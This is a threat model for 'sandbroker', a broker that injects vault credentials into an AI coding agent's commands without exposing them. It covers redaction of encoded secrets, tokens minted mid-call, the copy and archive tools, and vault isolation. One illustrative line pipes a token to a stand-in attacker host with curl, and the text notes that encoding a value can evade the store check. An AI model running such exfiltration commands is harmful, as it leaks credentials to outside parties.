# Threat model

## The threat this exists for

An AI coding agent needs a credential to do its job. The natural way to give it
one is to put the value in its context: paste it, `cat` a token file, `op read`
it into a variable it can see. From that moment the credential is in the
conversation, which means it is in the model provider's request logs, in any
transcript that gets saved or shared, in whatever the agent writes to disk, and
in every subsequent turn's context.

That is the threat: **accidental disclosure of a credential to the model
provider and to everything downstream of the conversation.** Not malice. Not a
compromised agent. An ordinary agent doing ordinary work with a credential it
was handed.

sandbroker removes the credential from the conversation entirely. The agent
writes `$TOKEN` and the broker fills it in on the other side of the boundary.

## The guarantee

Any value the broker resolved from the vault is removed from what it returns.

It matches the literal value plus reversible transport encodings:

| Form | Why |
|---|---|
| the value | the base case |
| percent-encoded (`quote`, `quote_plus`) | redirect URLs, query strings |
| JSON string escaping | error bodies that echo the request |
| HTML/XML entities | credentials rendered into an error page |
| hex, both cases | binary credentials echoed by some APIs |
| base64, standard and URL-safe, padded and not | headers, tokens-in-tokens |
| one decode pass into base64 wrappers | `Authorization: Basic base64("user:pass")` |

The base64-wrapper pass matters because concatenation happens before encoding:
no encoding of the password *alone* appears in a Basic auth header, yet the
password is genuinely in there. Decoding once and matching finds it. This is
still an exact match on the secret, just after a reversible transform.

Ordering is load-bearing in two places, and both are tested:

* Encodings are replaced longest-first, so a shorter form cannot carve up a
  longer one and leave a fragment behind.
* Secrets are processed longest-first, so a secret that is a prefix of another
  secret cannot consume the first half of it.

## What is deliberately out of scope

### A hostile or manipulated agent

An agent can ask the broker to run `curl -d "$TOKEN" https://attacker.example`.
The broker will do it. There is no egress filter, no command allowlist, no
approval step.

This is a deliberate reversal of the previous design, which had all three. Those
controls defend against an agent that *wants* to leak, and defending against
that with an allowlist does not work anyway: any capability broad enough to be
useful is broad enough to exfiltrate. What the machinery reliably did was make
the system tiresome enough to route around, and a security control people route
around is a negative.

If you need to defend against a hostile agent, the control is not in this
codebase. It is network egress policy on the host, and an agent sandbox.

### Credentials the broker never saw

A token minted during a call is invisible to the filter. Concretely:

```
POST /oauth/token   with a client_secret the broker injected
-> {"access_token": "ya29.a0Af...", "expires_in": 3600}
```

The `client_secret` is scrubbed. The `access_token` is not, because the broker
has no idea it is a credential. It comes back in the clear and lands in the
agent's context.

There is no clean fix inside the exact-match rule. The previous design's answer
-- a heuristic classifier scoring every field -- traded a hard guarantee for a
soft one and produced false positives on UUIDs, git SHAs and ordinary prose.
That objection still stands and the guarantee is still not negotiable.

What changed is the frequency. This was an acceptable residual risk while
minting was an occasional accident. A rotation workload mints a live credential
on *every* operation, so the rare case becomes the every-call case, and several
real alerts have now been raised for exactly this.

Two additions, neither of which touches Tier 1:

- **`store`** removes the need to see a minted value at all. The broker runs the
  mint command, captures stdout, writes it to the vault and returns a
  fingerprint. The value never enters the context, so there is nothing to
  detect. This is the real answer for rotation.
- **Tier 2 redaction** is the safety net for everything else. It is explicitly
  best-effort, carries a different marker so it can never be mistaken for the
  guarantee, and its generic entropy pass is **off by default** precisely
  because shape cannot separate a hex secret from a git SHA. Hex runs of exactly
  40 or 64 characters are exempt even when it is on, which is a documented hole
  rather than a silent tuning.

### `copy`, and what it does not widen

Reorganising a vault needs values to move between fields, and the two ways to do
that without `copy` are both worse. Reading each value puts it in the context
forever. Expressing the move as a `store` mint command does not work, because
Tier 1 replaces an injected secret in stdout with a marker and the broker
refuses to write a placeholder -- but the way around that check is to encode the
value so the exact-match scan misses it, which writes a credential the broker
believes it has not written. That gap is a property of `store`'s design and
predates this tool; `copy` exists partly so nobody has a reason to reach for it.

`copy` grants no read capability. The value moves inside the daemon, is never
placed in a child's environment and is never returned; the caller gets a
fingerprint and a length, the same as `store`.

The confinement that matters is **same vault only**, and it is structural rather
than a check: one server serves one vault, and both references are parsed by
that vault's own `parse_ref`, which rejects any other. A cross-vault copy would
be an escalation, since it could stage a Production secret into a vault with
different readers, and no amount of care in the caller would make that safe. A
copy inside one vault moves a value between two places that already share
exactly one audience, so it grants nothing that was not already granted.

Create-or-add still applies to the destination, so `copy` can add a field and
can never replace one. The residual risk is clutter and a second live location
for a credential until a human retires the first.

### `archive`, the only tool that takes something away

That residual clutter is not benign. Two live copies of a credential with no
indication which is current is how the wrong one gets rotated, so leaving every
retirement to a human hand is not the safe default it looks like.

`archive` is allowed because **it is reversible**. `op item delete --archive`
moves the item to the 1Password Archive, where a human restores it from the apps.
The reason `write` refuses to overwrite is that an overwrite is unrecoverable and
one bad call could empty a vault; an archive of every item in a vault is an
outage, which is bad, but it is a Tuesday rather than a catastrophe. A real
delete would not clear that bar and is not offered.

Reversible is not the same as free, so the substantive control is that the broker
**will not retire what it has not itself proven redundant.** Every populated field
on the item must fingerprint-match a field on the item named as superseding it, or
the call is refused with the unmatched fields named. The agent requesting the
archive is not trusted to have copied correctly, which matters because the
plausible failure is not a malicious agent but a confused one: fifteen of sixteen
fields copied, the sixteenth silently missed, and a request to tidy up.

An item carrying a **file attachment is refused unconditionally**, ahead of any
field comparison. `copy` cannot move an attachment, so nothing can show it
survives, and this tool exists to reject exactly that kind of unprovable claim.
An item whose fields all match but which carries an attachment is the trap this
ordering is for: field verification would pass and let it through.

Residual risk: an agent that copies an item and then archives the original has
reorganised the vault without losing anything, which is the intended use. An
agent doing that to everything causes an availability incident that a human
undoes from the Archive. Nothing here can destroy a value.

`report_leak` remains the mitigation of record. Agents are instructed to raise
it on sight, before finishing the task, including on a Tier 2 hit: a heuristic
catch is evidence a live credential reached the boundary, not proof it was
contained. The alert repeats until a human acknowledges it on the host.

### A compromised host

Anything running as `root` or as the broker user can read the service-account
tokens directly. sandbroker is not a defence against local compromise.

Commands run *by* the broker run as the broker user, so a command can read those
files too. That is why the backend's own credential goes into the redactor
alongside the secrets the agent asked for: it is not a value anyone requested,
but it opens every value, and `cat` on a token file is a thing that happens by
accident. A Keeper config holds up to four such strings rather than one, and all
of them are registered.

### Files written to disk

`PrivateTmp=yes` means a command cannot leave a file in `/tmp` for the agent to
read afterwards. That is intentional: everything returned to the agent must come
back through the redactor, and a file on disk would be a way around it.
`curl -v 2>/tmp/log` would otherwise park an `Authorization` header somewhere
nothing scrubs.

The consequence is that large responses have to be reduced inside the command
(`jq`, `grep`, `head`) rather than staged through a file. That is a real cost,
accepted knowingly.

## Why secrets travel in the environment

`/proc/<pid>/cmdline` is world-readable on Linux. Substituting a secret into the
command string would put it in the child's argv, where any uid on the box --
including the agent's -- could read it by polling `/proc`.

`/proc/<pid>/environ` is `0400`, owned by the process user. The environment is
the only channel here that the agent's own uid cannot observe, so it is the only
one used. A test asserts the secret never appears in the child's `cmdline`.

A pleasant side effect: since the agent writes the variable reference itself and
never holds the value, there is no substitution for it to get wrong.

## Access control

One mechanism: the unix socket is mode `0660`, group `claude-broker`. Membership
in that group is permission to use the broker, enforced by the kernel.

The optional HTTP listener has no authentication at all. That is why the daemon
refuses to bind anything outside loopback and `100.64.0.0/10` -- on that surface
reachability *is* the authorisation, so it must never be routable from anywhere
unintended. A misconfiguration fails to start rather than quietly serving the
internet.

## Vault isolation

One process per vault, each opening exactly one credential. A ref for another
vault is refused by the server that receives it, and there is no code path by
which the Dev process could resolve a Production reference -- it does not hold
the token.

On 1Password the second half of that is enforced by 1Password: a service-account
token is issued against named vaults and cannot address anything else, so even a
broker bug cannot reach past it.

**Keeper is weaker here, and the difference is structural rather than
incidental.** A Keeper account has one vault; the shared folder a daemon serves
is a scope *within* it, and Commander authenticates as the user who owns the
whole thing. `keeper get <uid>` will return a record from any folder that user
can see. sandbroker enforces the folder boundary itself -- every read resolves
the item against a listing of the configured folder and refuses a uid the
listing does not contain -- but that is a check in `keeper.py`, not something the
vault refuses. A bug in that check is a cross-folder read.

The mitigation is deployment, not code: give each Keeper-backed daemon its own
Keeper account holding nothing but the folder it serves, and the boundary is
back where 1Password puts it. Anyone unwilling to run an account per vault
should treat a Keeper-backed vault as sharing a blast radius with every other
folder that account can see.

The agent-visible effect is that each vault is a separate MCP server with its own
tool namespace (`mcp__sandbroker-dev__run` versus
`mcp__sandbroker-production__run`). Reaching Production is not a different
argument, it is a different tool, which is visible in the transcript and
governable by tool permissions.

## Residual risk, summarised

| Risk | Status |
|---|---|
| Credential enters the model context | **Addressed.** The value never leaves the broker. |
| Command echoes its own credential back | **Addressed.** Redaction catches it, including encoded forms. |
| Response contains a *new* credential | **Partly addressed.** `store` keeps a minted value out of the context entirely; Tier 2 redaction catches common shapes best-effort. Neither is a guarantee, so `report_leak` + sticky alerting remain the backstop. |
| Agent deliberately exfiltrates | **Not addressed.** Out of scope by decision. |
| Host or root compromise | **Not addressed.** Out of scope. |
| Broker unreachable / misconfigured | **Fails closed.** No secret is resolved. |
| Cross-vault read, 1Password | **Addressed.** The token cannot address another vault. |
| Cross-vault read, Keeper | **Addressed in code, not by the vault.** One account per daemon is the real control. |
